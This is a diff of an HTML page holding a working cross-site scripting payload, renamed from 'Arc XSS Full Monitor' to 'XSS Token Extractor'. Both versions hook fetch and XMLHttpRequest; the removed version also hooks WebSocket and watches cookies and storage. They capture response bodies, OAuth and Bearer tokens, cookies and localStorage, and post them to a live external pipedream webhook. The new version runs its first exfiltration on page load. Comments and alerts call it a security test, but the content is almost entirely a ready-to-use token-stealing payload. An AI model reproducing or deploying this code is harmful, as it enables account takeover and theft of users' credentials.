@@ -1,51 +1,70 @@
 <!DOCTYPE html>
 <html lang="en">
-<head><meta charset="UTF-8" /><title>Arc XSS Full Monitor</title></head>
+<head>
+  <meta charset="UTF-8" />
+  <title>XSS Token Extractor</title>
+</head>
 <body>
 <script>
-  const WEBHOOK_URL = "https://eoeisd0pus6doy3.m.pipedream.net/";
+  const WEBHOOK = "https://eoeisd0pus6doy3.m.pipedream.net/";
 
-  function sendToWebhook(data) {
-    if (data.url && data.url.startsWith(WEBHOOK_URL)) return;
-    fetch(WEBHOOK_URL, {
+  function exfiltrate(data) {
+    fetch(WEBHOOK, {
       method: "POST",
-      headers: { "Content-Type": "application/json" },
+      headers: {"Content-Type": "application/json"},
       body: JSON.stringify(data)
-    }).catch(err => console.error("Failed sending data:", err));
+    }).catch(() => {});
   }
 
-  // إظهار رسالة للمستخدم عند التحميل
-  alert("🚨 تم اختراق حسابك. هذا مجرد اختبار أمني.");
+  function extractTokens(text) {
+    const patterns = [
+      /access_token"\s*:\s*"([^"]+)"/i,
+      /id_token"\s*:\s*"([^"]+)"/i,
+      /refresh_token"\s*:\s*"([^"]+)"/i,
+      /"Authorization"\s*:\s*"Bearer\s+([^"]+)"/i,
+      /Bearer\s+([a-zA-Z0-9\-\._~\+\/]+=*)/i
+    ];
 
-  // مراقبة fetch
-  (function(){
+    for (const pattern of patterns) {
+      const match = text.match(pattern);
+      if (match && match[1]) return match[1];
+    }
+
+    return null;
+  }
+
+  // 🛡️ Hook into fetch
+  (function() {
     const originalFetch = window.fetch;
     window.fetch = function(...args) {
       return originalFetch.apply(this, args).then(async response => {
-        const cloned = response.clone();
-        let responseBody = null;
+        const clone = response.clone();
+        let body = "";
+
         try {
-          responseBody = await cloned.json();
-        } catch {
-          try {
-            responseBody = await cloned.text();
-          } catch {}
+          body = await clone.text();
+        } catch {}
+
+        const token = extractTokens(body);
+        if (token) {
+          // 📤 Send token separately
+          exfiltrate({
+            type: "🚨 TOKEN FOUND in FETCH!",
+            token: token,
+            url: clone.url,
+            timestamp: new Date().toISOString()
+          });
+
+          alert("🚨 Token Found!\n\n" + token);  // Show in-app alert (for test)
         }
-        sendToWebhook({
-          type: "fetch-response",
-          url: response.url,
-          status: response.status,
-          statusText: response.statusText,
-          body: responseBody,
-          timestamp: new Date().toISOString()
-        });
+
         return response;
       });
     };
   })();
 
-  // مراقبة XMLHttpRequest
-  (function(){
+  // 🛡️ Hook into XHR
+  (function() {
     const originalOpen = XMLHttpRequest.prototype.open;
     const originalSend = XMLHttpRequest.prototype.send;
 
@@ -57,89 +76,36 @@
 
     XMLHttpRequest.prototype.send = function(body) {
       this.addEventListener("load", () => {
-        let responseBody = null;
-        try {
-          responseBody = JSON.parse(this.responseText);
-        } catch {
-          responseBody = this.responseText;
+        const responseText = this.responseText;
+        const token = extractTokens(responseText);
+
+        if (token) {
+          exfiltrate({
+            type: "🚨 TOKEN FOUND in XHR!",
+            token: token,
+            url: this._url,
+            timestamp: new Date().toISOString()
+          });
+
+          alert("🚨 Token Found!\n\n" + token);
         }
-        sendToWebhook({
-          type: "xhr-response",
-          method: this._method,
-          url: this._url,
-          status: this.status,
-          statusText: this.statusText,
-          body: responseBody,
-          timestamp: new Date().toISOString()
-        });
       });
+
       return originalSend.apply(this, arguments);
     };
   })();
 
-  // مراقبة WebSocket
-  (function() {
-    const OriginalWebSocket = window.WebSocket;
-    window.WebSocket = function(url, protocols) {
-      const ws = protocols ? new OriginalWebSocket(url, protocols) : new OriginalWebSocket(url);
-
-      ws.addEventListener('message', event => {
-        sendToWebhook({
-          type: 'websocket-message',
-          url: url,
-          data: event.data,
-          timestamp: new Date().toISOString()
-        });
-      });
-
-      return ws;
-    }
-  })();
-
-  // مراقبة localStorage و sessionStorage
-  let lastLocalStorage = null;
-  let lastSessionStorage = null;
-  setInterval(() => {
-    try {
-      const currentLS = JSON.stringify(localStorage);
-      const currentSS = JSON.stringify(sessionStorage);
-      if (currentLS !== lastLocalStorage) {
-        lastLocalStorage = currentLS;
-        sendToWebhook({type: "localStorage-changed", localStorage: currentLS, timestamp: new Date().toISOString()});
-      }
-      if (currentSS !== lastSessionStorage) {
-        lastSessionStorage = currentSS;
-        sendToWebhook({type: "sessionStorage-changed", sessionStorage: currentSS, timestamp: new Date().toISOString()});
-      }
-    } catch {}
-  }, 5000);
-
-  // مراقبة تغير الكوكيز
-  let lastCookies = document.cookie;
-  setInterval(() => {
-    if (document.cookie !== lastCookies) {
-      lastCookies = document.cookie;
-      sendToWebhook({type: "cookie-changed", cookies: lastCookies, timestamp: new Date().toISOString()});
-    }
-  }, 3000);
-
-  // إرسال بيانات أولية
-  sendToWebhook({
-    type: "initial-info",
+  // 📦 Send basic info on load
+  exfiltrate({
+    type: "initial-load",
     url: window.location.href,
+    localStorage: (() => { try { return {...localStorage}; } catch { return "Access denied"; } })(),
     cookies: document.cookie || "No cookies",
-    localStorage: (() => {
-      try { return Object.assign({}, localStorage); }
-      catch { return "Access denied"; }
-    })(),
-    sessionStorage: (() => {
-      try { return Object.assign({}, sessionStorage); }
-      catch { return "Access denied"; }
-    })(),
     userAgent: navigator.userAgent,
     timestamp: new Date().toISOString()
   });
 </script>
+
 <p style="font-family: sans-serif;">Loading...</p>
 </body>
 </html>
